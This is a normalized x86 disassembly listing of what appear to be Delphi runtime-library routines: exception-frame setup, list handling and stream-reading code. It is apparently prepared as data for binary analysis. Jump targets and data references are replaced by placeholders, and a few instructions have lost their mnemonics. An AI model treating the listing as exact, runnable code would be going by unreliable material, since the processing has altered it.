mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413c88
sub_416c10
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413e40
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413e40
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413cd4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413c88
sub_416c58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416df1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4141e4
mov edi eax
xor edx edx
push ebp
push sub_416dd2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416dd9
mov eax [ rw-data ]
call sub_414248
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416db3
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416d61
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413de4
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413930
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d68
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410b3c
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416bd8
pop ecx
mov edx esi
mov eax edi
call sub_413cd4
mov eax ebx
call sub_4032a0
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416b10
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416c10
pop ecx
inc esi
sub_416d68
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
sub_416e00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4141e4
mov edi eax
xor eax eax
push ebp
push sub_416e9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414248
retn
mov edx ebx
mov eax edi
call sub_413de4
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413cd4
mov eax esi
call sub_4032a0
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407e18
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416eac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4141e4
mov edi eax
xor eax eax
push ebp
push sub_416f23
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414248
retn
mov edx ebx
mov eax edi
call sub_413de4
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413cd4
mov eax esi
call sub_4032a0
sub_416f54
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
pop ecx
pop edx
pop ebx
retn
sub_416f98
push ebx
push esi
push edi
call sub_40362c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4168d8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_416fd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418eac
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418fbc
call sub_416f48
sub_416ff8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407e18
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404074
sub_41702c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407e18
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418eac
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4170ed
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_417470
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_417470
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4170f4
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418fbc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416f48
sub_41711c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41713c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404310
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403524
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_416f48
sub_4171a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4141e4
mov esi eax
xor edx edx
push ebp
push sub_417214
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41721b
mov eax [ rw-data ]
call sub_414248
retn
mov edx ebx
mov eax esi
call sub_413de4
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4032a0
mov edx ebx
mov eax esi
call sub_413cd4
sub_417220
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41732f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417336
lea eax [ ebp - 0x8 ]
call sub_404074
retn
xor edx edx
push ebp
push sub_417312
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417364
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_416a34
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413de4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_40410c
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416b10
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413de4
call sub_4171a4
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413de4
mov edx eax
mov eax [ rw-data ]
call sub_41415c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413f30
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_417340
push ebx
mov ebx eax
mov eax ebx
call sub_417434
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_415e9c
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_417364
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4032a0
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413de4
call sub_4032a0
inc edi
dec esi
jne r-xdata
sub_4173a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031e8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_413478
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40322c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4134f0
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4133f0
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403204
test al al
jne r-xdata
sub_417470
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_4174bc
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_4174bc
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_41750c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_417557
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418d0c
mov eax [ ebp - 0x4 ]
call sub_404334
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41755e
lea eax [ ebp - 0x4 ]
call sub_404074
retn
call sub_416f48
sub_417564
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417604
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417108
test al al
jne r-xdata
mov eax ebx
call sub_417108
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4149a0
jmp r-xdata
mov eax ebx
call sub_41744c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_418074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41760b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414970
mov esi eax
mov eax ebx
call sub_41806c
jmp r-xdata
mov eax ebx
call sub_417fbc
mov eax ebx
call sub_417108
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4181d8
mov eax ebx
call sub_418074
sub_417634
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e6c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413c88
inc esi
dec ebx
jne r-xdata
sub_417670
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41a708
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e6c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405028
add esp 0x4
mov edx ebx
mov eax edi
call sub_41a6dc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e6c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41a6dc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_4176e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e6c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_417750
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_417770
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40275c
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_417750
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_4191a0
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4032a0
sub_4177d0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4178b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419340
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41788a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4178bb
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417770
pop ecx
test al al
jne r-xdata
call sub_403aa8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a54
sub_4178e0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417958
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40349c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413930
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417980
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4179fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419340
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40349c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417a00
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417770
pop ecx
test al al
jne r-xdata
call sub_403aa8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a54
sub_417a24
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417c45
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418cd0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418cd0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417c15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417bd3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_417670
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_4176e8
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_4177d0
pop ecx
push ebp
call sub_417980
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_4178e0
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403ad8
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_4176e8
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_4176e8
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c4c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405034
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40349c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413e40
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417634
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413c88
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417634
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413c88
sub_417bd8
push ebp
call sub_417750
pop ecx
test al al
je r-xdata
call sub_403a54
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4032a0
sub_417c60
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417cd0
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_417cbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417cd0
mov eax [ ebp - 0x4 ]
call sub_417220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
